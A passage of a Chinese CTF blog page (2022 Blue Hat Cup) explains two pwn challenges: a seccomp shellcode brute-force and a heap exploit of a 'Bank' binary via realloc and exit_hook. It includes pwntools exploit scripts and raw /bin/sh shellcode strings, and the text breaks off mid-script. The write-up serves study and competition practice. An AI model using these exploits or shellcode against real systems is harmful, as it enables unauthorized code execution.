@@ -1,0 +1,1234 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Noto Serif SC:300,300italic,400,400italic,700,700italic|Source Code Pro:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hacker.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/hacker.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="蓝帽杯," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="初赛escape_shellcode一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。 注意几点：一个是我们会发现每次rip中的地址和堆起">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022 蓝帽杯">
+<meta property="og:url" content="https://pursuezhou.github.io/2022/09/25/CTF/2022%E8%93%9D%E5%B8%BD%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Pursue">
+<meta property="og:description" content="初赛escape_shellcode一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。 注意几点：一个是我们会发现每次rip中的地址和堆起">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-09-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-03-13T12:06:59.366Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="蓝帽杯">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://pursuezhou.github.io/2022/09/25/CTF/2022蓝帽杯/"/>
+
+
+
+
+
+  <title>2022 蓝帽杯 | Pursue</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Pursue</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Better to light one candle than to curse the darkness.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://pursuezhou.github.io/2022/09/25/CTF/2022%E8%93%9D%E5%B8%BD%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/wechat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pursue">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">2022 蓝帽杯</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-09-25T00:00:00+08:00">
+                2022-09-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><h3 id="escape-shellcode"><a href="#escape-shellcode" class="headerlink" title="escape_shellcode"></a>escape_shellcode</h3><p>一道开启沙盒的shellcode题目，只允许我们用read和write，恶心的是居然把除了rip寄存器之外的所有寄存器都给覆盖成垃圾数据，导致我们不能泄露地址，也不能使用栈结构，最多能搜刮是rip里面存储的堆地址。所以我们采取爆破的方式来找flag，我们flag的低位保持0x120不变，所以只要往高位爆破就好。</p>
+<p>注意几点：一个是我们会发现每次rip中的地址和堆起始地址的偏移不一样，所以要用位运算来解决，不能用sub汇编来解决求取堆起始地址的问题；第二是我们不能在汇编之外进行循环，要在汇编里面完成循环，否则地址随机化会导致爆破不成功；第三是注意rip不可访问的问题。</p>
+<span id="more"></span>
+
+<p>WP如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./escape_shellcode&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lea r13, [rip]</span></span><br><span class="line"><span class="string">mov r11, 0xfffffffff000</span></span><br><span class="line"><span class="string">and r13, r11				// 求得堆地址</span></span><br><span class="line"><span class="string">add r13, 0x120				// 使低位为0x120</span></span><br><span class="line"><span class="string">mov r10, r13</span></span><br><span class="line"><span class="string">mov r14, 0					// r14是每次起始地址减去的长度</span></span><br><span class="line"><span class="string">mov r15, 0x10000			// r15是循环的次数</span></span><br><span class="line"><span class="string">loop :</span></span><br><span class="line"><span class="string">mov r13, r10</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rdx, 0x30</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">sub r15, 1</span></span><br><span class="line"><span class="string">add r14, 0x1000				// 进行0x1000大小的递增</span></span><br><span class="line"><span class="string">sub r13, r14</span></span><br><span class="line"><span class="string">mov rsi, r13</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">cmp r15, 0</span></span><br><span class="line"><span class="string">ja loop						// r15大于0的时候进行跳转</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = asm(pld)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>只要爆破1秒就能出flag。</p>
+<p>其他方法：如果给了libc版本，可以通过释放堆的fd泄露libc，通过libc里面的environ泄露栈，通过栈可以泄露代码段的地址，也就能得到flag的地址。</p>
+<h3 id="Bank"><a href="#Bank" class="headerlink" title="Bank"></a>Bank</h3><p>类似于银行ATM取款机的一道题目，主要的难点在代码审计，libc版本是2.31，发现漏洞主要存在于Transfer这一个功能中，我们开始可以利用的钱是0x190(有个强制类型转换)，也就是400块，Transfer中的主要实现如下：</p>
+<blockquote>
+<p>注意在Transfer中可以进行刷钱，只要我们输入的金额和我们现有的金额相同就好，比赛时候就是没想通这一点，没钱💴用是真的难受😫！！！这道题就叫：用多少取多少😁</p>
+</blockquote>
+<ul>
+<li>admin：花大于30块钱，可以得到一个泄露地址的机会</li>
+<li>hacker：花大于50块钱，可以得到一个释放随机地址堆块的机会</li>
+<li>guest：花大于5块钱，可以<code>malloc(0x18)</code>，然后写入0x10字节大小的数据</li>
+<li>ghost：花大于10块钱，realloc一个大小小于等于0x100的堆块</li>
+<li>abyss：无需花钱，进行任意地址写，然后<code>exit(0)</code></li>
+</ul>
+<p>所以我们准备打<code>exit_hook</code>，泄露libc然后找到<code>_rtld_global</code>结构体，覆盖<code>__rtld_lock_unlock_recursive</code>或者<code>_rtld_lock_lock_recursive</code>为onegadget。</p>
+<p>exit函数调用流程：<code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive or _rtld_lock_lock_recursive</code></p>
+<blockquote>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43116977/article/details/105485947">(9条消息) exit_hook劫持_starssgo的博客-CSDN博客</a></p>
+</blockquote>
+<p>介绍一下realloc函数的用法，之前没遇到过：</p>
+<p><code>void *realloc(void *ptr, size_t size)</code>：其中ptr是指向一个要重新分配的堆块，如果ptr为空，那么会分配一个新的内存块，并且函数返回一个指向它的指针；size是新的内存块的大小，如果为0并且ptr指向一个已经存在的堆块，那么ptr指向的内存块会被释放，并且返回一个空指针。需要注意的是，如果申请的大小大于原来堆块的大小，realloc会将之前的chunk释放掉，再去处理我们请求的堆块；如果申请的大小小于堆块的大小，realloc会对原有的chunk进行切分，将多余的给释放掉。在这道题目中，可以通过<strong>先realloc一个大的再realloc一个小的</strong>达到效果。</p>
+<p>WP如下：</p>
+<blockquote>
+<p>用的不是题目给的libc-2.31，用的是本机的libc-2.31，所以偏移可能有差别</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./Bank&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./Bank&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slibc</span>(<span class="params">leak_name, leak_addr, flag = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        libc_base = leak_addr - libc.symbols[<span class="built_in">str</span>(leak_name)]</span><br><span class="line">        sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        libcsch = LibcSearcher(<span class="built_in">str</span>(leak_name), leak_addr)</span><br><span class="line">        libc_base = leak_addr - libcsch.dump(<span class="built_in">str</span>(leak_name))</span><br><span class="line">        sys_addr = libc_base + libcsch.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        bin_sh = libc_base + libcsch.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [sys_addr, bin_sh]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>(<span class="params">card_number, password</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Login&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Card Numbers: &#x27;</span>, <span class="built_in">str</span>(card_number))</span><br><span class="line">    sla(<span class="string">b&#x27;Password: &#x27;</span>, <span class="built_in">str</span>(password))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Info</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Deposit</span>(<span class="params">money</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Deposit&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;How Much? &#x27;</span>, <span class="built_in">str</span>(money))   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Transfer</span>(<span class="params">money, name</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;who? &#x27;</span>, name)</span><br><span class="line">    sla(<span class="string">b&#x27;How much? &#x27;</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Put</span>(<span class="params">money</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Click: &#x27;</span>, <span class="string">b&#x27;Put&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;How Much? &#x27;</span>, <span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">money</span>):           <span class="comment"># 30</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;admin&#x27;</span>)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hacker</span>(<span class="params">money, ptr</span>):     <span class="comment"># 50</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;hacker&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;hacker: Great!&#x27;</span>, <span class="built_in">str</span>(ptr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guest</span>(<span class="params">money, context</span>):  <span class="comment"># 5</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;guest&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;data: &#x27;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ghost</span>(<span class="params">money, size</span>):     <span class="comment"># 10</span></span><br><span class="line">    Transfer(money, <span class="string">b&#x27;ghost&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;ghost: &amp;^%$#@!   :)&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abyss</span>(<span class="params">money, addr</span>):</span><br><span class="line">    Transfer(money, <span class="string">b&#x27;abyss&#x27;</span>)</span><br><span class="line">    <span class="comment"># dbg()</span></span><br><span class="line">    sl(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">Login(<span class="number">11</span>, <span class="number">11111111</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">Put(<span class="number">11</span>)</span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x100</span>)</span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x28</span>)      <span class="comment"># use realloc to free</span></span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x100</span>)</span><br><span class="line">ghost(<span class="number">11</span>, <span class="number">0x28</span>)      <span class="comment"># use realloc to free</span></span><br><span class="line">Put(<span class="number">33</span>)       <span class="comment"># 44 - 11 = 33</span></span><br><span class="line">admin(<span class="number">44</span>)</span><br><span class="line">ru(<span class="string">&#x27;I think &#x27;</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">lg(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line">ptr_init = heap_addr + <span class="number">0x2a0</span></span><br><span class="line">lg(<span class="string">&#x27;ptr_init&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"><span class="comment"># tcache_max = 0x410</span></span><br><span class="line"><span class="comment"># make fake_chunk(size &gt; 0x410)</span></span><br><span class="line">free_ptr = heap_addr + <span class="number">0x4e0</span> + <span class="number">0x10</span>     <span class="comment"># 0x420</span></span><br><span class="line">lg(<span class="string">&#x27;free_ptr&#x27;</span>)</span><br><span class="line">guest(<span class="number">44</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))      <span class="comment"># fake_head</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    guest(<span class="number">44</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">guest(<span class="number">44</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">guest(<span class="number">44</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">Put(<span class="number">7</span>)       <span class="comment"># 51 - 44 = 7</span></span><br><span class="line">hacker(<span class="number">51</span>, free_ptr)</span><br><span class="line">Put(<span class="number">23</span>)       <span class="comment"># 74 - 51 = 23</span></span><br><span class="line">admin(<span class="number">74</span>)</span><br><span class="line">ru(<span class="string">&#x27;I think &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(r(<span class="number">14</span>), <span class="number">16</span>) - <span 